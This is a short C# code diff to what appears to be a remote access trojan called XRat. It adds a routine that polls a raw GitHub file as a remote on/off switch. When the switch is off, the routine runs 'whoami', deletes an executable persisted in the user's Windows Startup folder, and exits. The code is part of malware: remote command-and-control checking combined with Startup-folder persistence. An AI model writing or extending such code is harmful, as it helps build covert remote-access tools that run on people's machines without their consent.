@@ -246,7 +246,28 @@ namespace XRat
 
         public static async Task<bool> Validable()
         {
-            await ParseCodeFromRawLink("");
+            return bool.Parse(await ParseCodeFromRawLink("https://raw.githubusercontent.com/UndefinedClear/XRatGlobalSettings/refs/heads/main/ControlXRatGlobaActivity.txt"));    
+        }
+
+        public static async Task ControlXRatGlobaActivity()
+        {
+            if (!await Validable())
+            {
+                string username = ProCMD("whoami").output;
+                username = username.Split('\\')[1];
+
+                string autostart_path = $"""C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\test.exe""";
+                string command = "del " + autostart_path;
+
+                if (ProCMD(command).success)
+                {
+                    Environment.Exit(0);
+                }
+                else
+                {
+                    Environment.Exit(1);
+                }
+            }
         }
 
         public static async Task<string> ParseCodeFromRawLink(string url)
